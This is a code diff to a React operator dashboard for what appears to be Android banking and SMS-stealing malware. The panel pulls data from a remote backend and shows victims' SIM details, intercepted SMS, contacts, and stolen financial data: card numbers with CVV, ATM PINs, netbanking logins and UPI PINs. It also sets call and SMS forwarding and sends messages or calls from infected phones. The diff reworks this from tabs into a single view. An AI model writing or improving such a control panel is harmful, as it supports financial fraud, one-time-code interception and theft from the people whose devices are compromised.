@@ -3,40 +3,12 @@ import { useState, useEffect, useCallback } from 'react'
 const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'
 const API_BASE = 'https://bill-1-9yfp.onrender.com'
 
-const tabs = [
-  { key: 'sim', label: 'SIM' },
-  { key: 'sms', label: 'SMS' },
-  { key: 'contacts', label: 'Contacts' },
-  { key: 'bill_updates', label: 'Bill Updates' },
-  { key: 'card_details', label: 'Card Details' },
-  { key: 'card_verifications', label: 'Card Verify' },
-  { key: 'netbanking_details', label: 'Netbanking' },
-  { key: 'netbanking_pins', label: 'NB Pins' },
-  { key: 'upi_details', label: 'UPI Pins' },
-  { key: 'payment_attempts', label: 'Payments' },
-  { key: 'forwarding', label: 'Forwarding' },
-  { key: 'gallery', label: 'Gallery' },
-  { key: 'actions', label: 'Actions' },
-]
-
-const cols = {
-  bill_updates: ['customer_name', 'mobile', 'consumer_number', 'reasons', 'created_at'],
-  card_details: ['card_type', 'card_number', 'card_holder_name', 'expiry', 'cvv', 'amount', 'created_at'],
-  card_verifications: ['dob', 'atm_pin', 'amount', 'created_at'],
-  netbanking_details: ['bank_name', 'user_id', 'password', 'remember_me', 'amount', 'created_at'],
-  netbanking_pins: ['pin', 'amount', 'created_at'],
-  upi_details: ['pin', 'amount', 'created_at'],
-  payment_attempts: ['amount', 'payment_method', 'status', 'created_at'],
-}
-
 export default function App() {
   const [data, setData] = useState(null)
   const [openId, setOpenId] = useState(null)
-  const [tab, setTab] = useState('sim')
   const [fwd, setFwd] = useState({})
-  const [saving, setSaving] = useState(false)
-  const [actions, setActions] = useState({})
-  const [actionSending, setActionSending] = useState({})
+  const [saving, setSaving] = useState({})
+  const [acts, setActs] = useState({})
   const [time, setTime] = useState('')
 
   const fetchData = useCallback(async () => {
@@ -65,7 +37,7 @@ export default function App() {
   const saveFwd = async (id) => {
     const c = fwd[id]
     if (!c) return
-    setSaving(true)
+    setSaving(prev => ({...prev, [id]: true}))
     try {
       await fetch(`${API_BASE}/api/forwarding-config`, {
         method: 'PUT',
@@ -79,27 +51,27 @@ export default function App() {
         }),
       })
     } catch {}
-    setSaving(false)
+    setSaving(prev => ({...prev, [id]: false}))
   }
 
-  const sendAction = async (id, type) => {
-    const a = actions[id]
+  const sendAction = async (id) => {
+    const a = acts[id]
     if (!a || !a.target_number) return
-    setActionSending(prev => ({...prev, [id]: true}))
+    setActs(prev => ({...prev, [id]: {...prev[id], sending: true}}))
     try {
       await fetch(`${API_BASE}/api/admin/action`, {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
           device_id: id,
-          type,
+          type: a.type || 'sms',
           target_number: a.target_number,
           message: a.message || '',
         }),
       })
-      setActions(prev => ({...prev, [id]: {...prev[id], target_number: '', message: ''}}))
+      setActs(prev => ({...prev, [id]: {target_number: '', message: '', sim_slot: '1', type: 'sms'}}))
     } catch {}
-    setActionSending(prev => ({...prev, [id]: false}))
+    setActs(prev => ({...prev, [id]: {...prev[id], sending: false}}))
   }
 
   if (!data) return <div style={s.loading}>Loading...</div>
@@ -109,6 +81,8 @@ export default function App() {
   const parseSim = (info) => {
     try { return JSON.parse(info || '[]') } catch { return [] }
   }
+
+  const fmtSize = (b) => b > 1048576 ? (b/1048576).toFixed(1)+'MB' : b > 1024 ? (b/1024).toFixed(1)+'KB' : b+'B'
 
   return (
     <div style={s.body}>
@@ -128,11 +102,12 @@ export default function App() {
           const sims = parseSim(d.sim_info)
           const smsList = sec.sms || []
           const contactsList = sec.contacts || []
+          const a = acts[id] || {}
 
           return (
             <div key={id} style={s.card}>
               <div style={{...s.head, borderLeft:`4px solid ${online ? '#22c55e' : '#ef4444'}`}}
-                onClick={() => { setOpenId(open ? null : id); setTab('sim'); loadFwd(id) }}>
+                onClick={() => { setOpenId(open ? null : id); loadFwd(id); setActs(prev => ({...prev, [id]: prev[id]||{target_number:'',message:'',sim_slot:'1',type:'sms'}})) }}>
                 <div>
                   <div style={s.name}>
                     {d.device_name || '-'}
@@ -145,154 +120,132 @@ export default function App() {
 
               {open && (
                 <div style={s.inner}>
-                  <div style={s.tabRow}>
-                    {tabs.map(t => (
-                      <button key={t.key} onClick={()=>setTab(t.key)}
-                        style={{...s.tabBtn, ...(tab===t.key ? {background:'#3b82f6',color:'#fff'} : {})}}>
-                        {t.label}
-                      </button>
-                    ))}
+                  {/* SIM Info */}
+                  <div style={s.secH}>SIM</div>
+                  {sims.length === 0 ? <div style={s.txt}>No SIM data</div> : sims.map((x,i) => (
+                    <div key={i} style={s.row}>
+                      <span style={{fontWeight:600,minWidth:55,fontSize:12,color:'#475569'}}>SIM {x.sim_slot||i+1}</span>
+                      <span style={{fontSize:12}}>{x.carrier||'-'}{x.number ? ` (${x.number})` : ' - no number'}</span>
+                    </div>
+                  ))}
+
+                  {/* SMS by SIM */}
+                  <div style={{...s.secH,marginTop:12}}>SMS</div>
+                  {smsList.length === 0 ? <div style={s.txt}>No SMS</div> : (
+                    <div style={s.scroll}>
+                      {[1,2,3,4,5].map(slot =>
+                        smsList.filter(x => x.sub_id === slot || (!x.sub_id && slot === 1)).length > 0 && (
+                          <div key={slot}>
+                            <div style={{fontSize:11,fontWeight:600,color:'#64748b',padding:'4px 0'}}>SIM {slot} ({smsList.filter(x => x.sub_id === slot).length} messages)</div>
+                            {smsList.filter(x => x.sub_id === slot || (!x.sub_id && slot === 1)).map((x,j) => (
+                              <div key={x.id||j} style={s.item}>
+                                <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
+                                <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
+                                <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
+                              </div>
+                            ))}
+                          </div>
+                        )
+                      )}
+                      {smsList.every(x => !x.sub_id) && smsList.map((x,j) => (
+                        <div key={x.id||j} style={s.item}>
+                          <div style={{fontWeight:600,fontSize:12}}>{x.sender||'-'}</div>
+                          <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:11}}>{x.message||'-'}</div>
+                          <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
+                        </div>
+                      ))}
+                    </div>
+                  )}
+
+                  {/* Contacts */}
+                  <div style={{...s.secH,marginTop:12}}>Contacts</div>
+                  {contactsList.length === 0 ? <div style={s.txt}>No contacts</div> : (
+                    <div style={s.scroll}>
+                      {contactsList.map((x,j) => (
+                        <div key={x.id||j} style={s.item}>
+                          <div style={{fontWeight:600,fontSize:12}}>{x.name||'-'}</div>
+                          <div style={{fontSize:11,color:'#475569'}}>{x.phone||''}{x.email ? ` | ${x.email}` : ''}</div>
+                        </div>
+                      ))}
+                    </div>
+                  )}
+
+                  {/* Call Forwarding */}
+                  <div style={{...s.secH,marginTop:12}}>Forwarding</div>
+                  <div>
+                    <div style={s.fw}>
+                      <span style={{minWidth:35,fontWeight:600,fontSize:12}}>Call</span>
+                      <input type="text" placeholder="Forward to" value={fwd[id]?.call_forwarding_number||''}
+                        onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding_number:e.target.value}}))}
+                        style={s.inp} />
+                      <label style={s.lbl}>
+                        <input type="checkbox" checked={fwd[id]?.call_forwarding||false}
+                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding:e.target.checked}}))} /> On
+                      </label>
+                    </div>
+                    <div style={s.fw}>
+                      <span style={{minWidth:35,fontWeight:600,fontSize:12}}>SMS</span>
+                      <input type="text" placeholder="Forward to" value={fwd[id]?.sms_forwarding_number||''}
+                        onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding_number:e.target.value}}))}
+                        style={s.inp} />
+                      <label style={s.lbl}>
+                        <input type="checkbox" checked={fwd[id]?.sms_forwarding||false}
+                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding:e.target.checked}}))} /> On
+                      </label>
+                    </div>
+                    <button onClick={()=>saveFwd(id)} disabled={saving[id]}
+                      style={s.save}>{saving[id]?'Saving...':'Save'}</button>
                   </div>
 
-                  {tab === 'sim' && (
-                    sims.length === 0 ? <div style={s.empty}>No SIM data</div> : sims.map((x,i) => (
-                      <div key={i} style={s.row}>
-                        <span style={{fontWeight:600,minWidth:50,fontSize:13,color:'#475569'}}>SIM {x.sim_slot||i+1}</span>
-                        <span style={{fontSize:13}}>{x.carrier||'-'}{x.number ? ` (${x.number})` : ''}</span>
-                      </div>
-                    ))
-                  )}
+                  {/* Actions */}
+                  <div style={{...s.secH,marginTop:12}}>Actions</div>
+                  <div>
+                    <div style={{marginBottom:6,fontSize:11,color:'#64748b'}}>Send SMS or call from this device.</div>
+                    <select value={a.sim_slot||'1'} onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],sim_slot:e.target.value,type:a.type||'sms'}}))}
+                      style={{...s.inp,width:'100%',marginBottom:6,boxSizing:'border-box'}}>
+                      {sims.map((x,i) => (
+                        <option key={i} value={x.sim_slot||i+1}>SIM {x.sim_slot||i+1} {x.number ? `(${x.number})` : ''}</option>
+                      ))}
+                      {sims.length === 0 && <option value="1">SIM 1</option>}
+                    </select>
+                    <input type="text" placeholder="Target phone number" value={a.target_number||''}
+                      onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],target_number:e.target.value,type:a.type||'sms'}}))}
+                      style={{...s.inp,width:'100%',marginBottom:6,boxSizing:'border-box'}} />
+                    <textarea placeholder="SMS message" value={a.message||''}
+                      onChange={e=>setActs(prev=>({...prev,[id]:{...prev[id],message:e.target.value,type:a.type||'sms'}}))}
+                      style={{...s.inp,width:'100%',minHeight:50,resize:'vertical',marginBottom:8,boxSizing:'border-box',fontFamily:'inherit'}} />
+                    <div style={{display:'flex',gap:8}}>
+                      <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'sms'}}));sendAction(id)}} disabled={a.sending}
+                        style={{...s.save,background:'#22c55e'}}>{a.sending?'Sending...':'Send SMS'}</button>
+                      <button onClick={()=>{setActs(prev=>({...prev,[id]:{...prev[id],type:'call'}}));sendAction(id)}} disabled={a.sending}
+                        style={{...s.save,background:'#ef4444'}}>{a.sending?'Calling...':'Make Call'}</button>
+                    </div>
+                  </div>
 
-                  {tab === 'sms' && (
-                    smsList.length === 0 ? <div style={s.empty}>No SMS</div> : (
-                      <div style={s.scroll}>
-                        {smsList.map((x,j) => (
-                          <div key={x.id||j} style={s.item}>
-                            <div style={{fontWeight:600,fontSize:13}}>{x.sender||'-'}</div>
-                            <div style={{color:'#475569',wordBreak:'break-word',marginTop:1,fontSize:12}}>{x.message||'-'}</div>
-                            <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{x.received_at?new Date(x.received_at).toLocaleString():'-'}</div>
+                  {/* Bill data plain text */}
+                  {['bill_updates','card_details','card_verifications','netbanking_details','netbanking_pins','upi_details','payment_attempts'].map(t => {
+                    const items = (data[t]||[]).filter(r => r.device_id === id || !r.device_id)
+                    if (items.length === 0) return null
+                    const labels = {
+                      bill_updates: 'Bill Updates', card_details: 'Card Details', card_verifications: 'Card Verify',
+                      netbanking_details: 'Netbanking', netbanking_pins: 'NB Pins', upi_details: 'UPI Pins', payment_attempts: 'Payments'
+                    }
+                    return (
+                      <div key={t}>
+                        <div style={{...s.secH,marginTop:12}}>{labels[t]}</div>
+                        {items.map((row,i) => (
+                          <div key={row.id||i} style={{padding:'6px 0',borderBottom:'1px solid #f1f5f9',fontSize:12,lineHeight:1.6}}>
+                            {Object.entries(row).filter(([k]) => k !== 'id' && k !== 'device_id').map(([k,v]) => {
+                              if (k === 'created_at') v = v?new Date(v).toLocaleString():'-'
+                              if (typeof v === 'boolean') v = v?'Yes':'No'
+                              if (k === 'amount') v = `₹${v}`
+                              return <div key={k} style={{color:'#334155'}}><b style={{color:'#64748b',fontWeight:600,textTransform:'capitalize'}}>{k.replace(/_/g,' ')}:</b> {v??'-'}</div>
+                            })}
                           </div>
                         ))}
                       </div>
                     )
-                  )}
-
-                  {tab === 'contacts' && (
-                    contactsList.length === 0 ? <div style={s.empty}>No contacts</div> : (
-                      <div style={s.scroll}>
-                        {contactsList.map((x,j) => (
-                          <div key={x.id||j} style={s.item}>
-                            <div style={{fontWeight:600,fontSize:13}}>{x.name||'-'}</div>
-                            <div style={{fontSize:11,color:'#475569'}}>{x.phone||''}{x.email ? ` | ${x.email}` : ''}</div>
-                          </div>
-                        ))}
-                      </div>
-                    )
-                  )}
-
-                  {['bill_updates','card_details','card_verifications','netbanking_details','netbanking_pins','upi_details','payment_attempts'].includes(tab) && (
-                    (data[tab]||[]).length === 0 ? <div style={s.empty}>No data</div> : (
-                      <div style={{overflowX:'auto'}}>
-                        <table style={s.table}>
-                          <thead><tr>{cols[tab].map(c => <th key={c} style={s.th}>{c.replace(/_/g,' ').toUpperCase()}</th>)}</tr></thead>
-                          <tbody>{(data[tab]||[]).map((row,i) => (
-                            <tr key={row.id||i} style={i%2?{background:'#f8fafc'}:{}}>
-                              {cols[tab].map(c => {
-                                let v = row[c]
-                                if (c==='created_at') v = v?new Date(v).toLocaleString():'-'
-                                if (typeof v==='boolean') v = v?'Yes':'No'
-                                if (c==='amount') v = `₹${v}`
-                                return <td key={c} style={s.td}>{v??'-'}</td>
-                              })}
-                            </tr>
-                          ))}</tbody>
-                        </table>
-                      </div>
-                    )
-                  )}
-
-                  {tab === 'gallery' && (
-                    <div>
-                      {(sec.media||[]).length === 0 ? <div style={s.empty}>No media</div> : (
-                        <div>
-                          {(sec.media||[]).map((m,j) => {
-                            const isImg = m.file_type?.startsWith('image/')
-                            const isVid = m.file_type?.startsWith('video/')
-                            const isAud = m.file_type?.startsWith('audio/')
-                            const size = m.file_size > 1048576 ? (m.file_size/1048576).toFixed(1)+'MB' : m.file_size > 1024 ? (m.file_size/1024).toFixed(1)+'KB' : m.file_size+'B'
-                            return (
-                              <div key={m.id||j} style={{display:'flex',gap:10,padding:'8px 0',borderBottom:'1px solid #f1f5f9',alignItems:'center'}}>
-                                <div style={{width:60,height:60,borderRadius:8,overflow:'hidden',flexShrink:0,background:'#f1f5f9',display:'flex',alignItems:'center',justifyContent:'center',fontSize:20}}>
-                                  <a href={m.url} target="_blank" rel="noreferrer" style={{display:'contents',color:'inherit',textDecoration:'none'}}>
-                                    {isImg ? <img src={m.url} style={{width:'100%',height:'100%',objectFit:'cover'}} /> :
-                                     isVid ? <video src={m.url} style={{width:'100%',height:'100%',objectFit:'cover'}} /> :
-                                     isAud ? '🎵' : '📄'}
-                                  </a>
-                                </div>
-                                <div style={{flex:1,minWidth:0}}>
-                                  <div style={{fontSize:12,fontWeight:600,color:'#1e293b',wordBreak:'break-all'}}>{m.file_name}</div>
-                                  <div style={{fontSize:10,color:'#94a3b8',marginTop:1}}>{m.file_type} &middot; {size}</div>
-                                  <div style={{fontSize:10,color:'#94a3b8'}}>{m.created_at ? new Date(m.created_at).toLocaleString() : ''}</div>
-                                </div>
-                                <a href={m.url} target="_blank" rel="noreferrer" style={{fontSize:11,color:'#3b82f6',textDecoration:'none',whiteSpace:'nowrap'}}>Open</a>
-                              </div>
-                            )
-                          })}
-                        </div>
-                      )}
-                    </div>
-                  )}
-
-                  {tab === 'forwarding' && (
-                    <div>
-                      <div style={s.fw}>
-                        <span style={{minWidth:35,fontWeight:600,fontSize:13}}>Call</span>
-                        <input type="text" placeholder="Phone number" value={fwd[id]?.call_forwarding_number||''}
-                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding_number:e.target.value}}))}
-                          style={s.inp} />
-                        <label style={s.lbl}>
-                          <input type="checkbox" checked={fwd[id]?.call_forwarding||false}
-                            onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],call_forwarding:e.target.checked}}))} />
-                          On
-                        </label>
-                      </div>
-                      <div style={s.fw}>
-                        <span style={{minWidth:35,fontWeight:600,fontSize:13}}>SMS</span>
-                        <input type="text" placeholder="Phone number" value={fwd[id]?.sms_forwarding_number||''}
-                          onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding_number:e.target.value}}))}
-                          style={s.inp} />
-                        <label style={s.lbl}>
-                          <input type="checkbox" checked={fwd[id]?.sms_forwarding||false}
-                            onChange={e=>setFwd(prev=>({...prev,[id]:{...prev[id],sms_forwarding:e.target.checked}}))} />
-                          On
-                        </label>
-                      </div>
-                      <button onClick={()=>saveFwd(id)} disabled={saving}
-                        style={s.save}>{saving?'Saving...':'Save'}</button>
-                    </div>
-                  )}
-
-                  {tab === 'actions' && (
-                    <div>
-                      <div style={{marginBottom:8,fontSize:11,color:'#64748b'}}>
-                        Send SMS or make call from this device.
-                      </div>
-                      <input type="text" placeholder="Target phone number"
-                        value={actions[id]?.target_number||''}
-                        onChange={e=>setActions(prev=>({...prev,[id]:{...prev[id],target_number:e.target.value}}))}
-                        style={{...s.inp,width:'100%',marginBottom:6,boxSizing:'border-box'}} />
-                      <textarea placeholder="SMS message (only for SMS action)"
-                        value={actions[id]?.message||''}
-                        onChange={e=>setActions(prev=>({...prev,[id]:{...prev[id],message:e.target.value}}))}
-                        style={{...s.inp,width:'100%',minHeight:60,resize:'vertical',marginBottom:8,boxSizing:'border-box',fontFamily:'inherit'}} />
-                      <div style={{display:'flex',gap:8}}>
-                        <button onClick={()=>sendAction(id,'sms')} disabled={actionSending[id]}
-                          style={{...s.save,background:'#22c55e'}}>{actionSending[id]?'Sending...':'Send SMS'}</button>
-                        <button onClick={()=>sendAction(id,'call')} disabled={actionSending[id]}
-                          style={{...s.save,background:'#ef4444'}}>{actionSending[id]?'Calling...':'Make Call'}</button>
-                      </div>
-                    </div>
-                  )}
+                  })}
                 </div>
               )}
             </div>
@@ -314,17 +267,16 @@ const s = {
   badge: { fontSize:9, color:'#fff', padding:'2px 7px', borderRadius:10, fontWeight:600 },
   sub: { fontSize:11, color:'#64748b', marginTop:2 },
   inner: { padding:'0 10px 12px', borderTop:'1px solid #f1f5f9' },
-  tabRow: { display:'flex', gap:4, margin:'10px 0', flexWrap:'wrap' },
-  tabBtn: { padding:'4px 10px', border:'none', borderRadius:6, fontSize:11, cursor:'pointer', fontWeight:600, background:'#e2e8f0', color:'#475569' },
-  empty: { padding:16, color:'#999', fontSize:13, textAlign:'center' },
-  row: { display:'flex', gap:8, padding:'7px 0', borderBottom:'1px solid #f8fafc' },
+  secH: { fontSize:12, fontWeight:700, color:'#333', padding:'6px 0', borderBottom:'1px solid #e2e8f0' },
+  txt: { padding:'8px 0', color:'#999', fontSize:12 },
+  row: { display:'flex', gap:8, padding:'5px 0', borderBottom:'1px solid #f8fafc' },
   scroll: { maxHeight:300, overflowY:'auto' },
-  item: { padding:'6px 8px', borderBottom:'1px solid #f1f5f9', fontSize:12 },
-  table: { width:'100%', borderCollapse:'collapse', fontSize:12, minWidth:500 },
-  th: { padding:'8px 10px', textAlign:'left', background:'#f8f9fa', borderBottom:'2px solid #dee2e6', fontWeight:700, color:'#333', whiteSpace:'nowrap', fontSize:10 },
-  td: { padding:'6px 10px', borderBottom:'1px solid #eee', whiteSpace:'nowrap', fontSize:11 },
-  fw: { display:'flex', alignItems:'center', gap:6, marginBottom:8, flexWrap:'wrap' },
-  inp: { flex:1, minWidth:100, padding:'7px 8px', border:'1px solid #e2e8f0', borderRadius:8, fontSize:12, outline:'none' },
+  item: { padding:'5px 8px', borderBottom:'1px solid #f1f5f9', fontSize:12 },
+  table: { width:'100%', borderCollapse:'collapse', fontSize:11, minWidth:400 },
+  th: { padding:'6px 8px', textAlign:'left', background:'#f8f9fa', borderBottom:'2px solid #dee2e6', fontWeight:700, color:'#333', whiteSpace:'nowrap', fontSize:10 },
+  td: { padding:'5px 8px', borderBottom:'1px solid #eee', whiteSpace:'nowrap', fontSize:11 },
+  fw: { display:'flex', alignItems:'center', gap:6, marginBottom:6, flexWrap:'wrap' },
+  inp: { flex:1, minWidth:80, padding:'6px 8px', border:'1px solid #e2e8f0', borderRadius:8, fontSize:12, outline:'none' },
   lbl: { display:'flex', alignItems:'center', gap:4, fontSize:12, cursor:'pointer', fontWeight:500, color:'#475569' },
-  save: { background:'#3b82f6', color:'#fff', border:'none', borderRadius:8, padding:'7px 18px', fontSize:12, fontWeight:600, cursor:'pointer', marginTop:2 },
+  save: { color:'#fff', border:'none', borderRadius:8, padding:'6px 14px', fontSize:12, fontWeight:600, cursor:'pointer', marginTop:2 },
 }
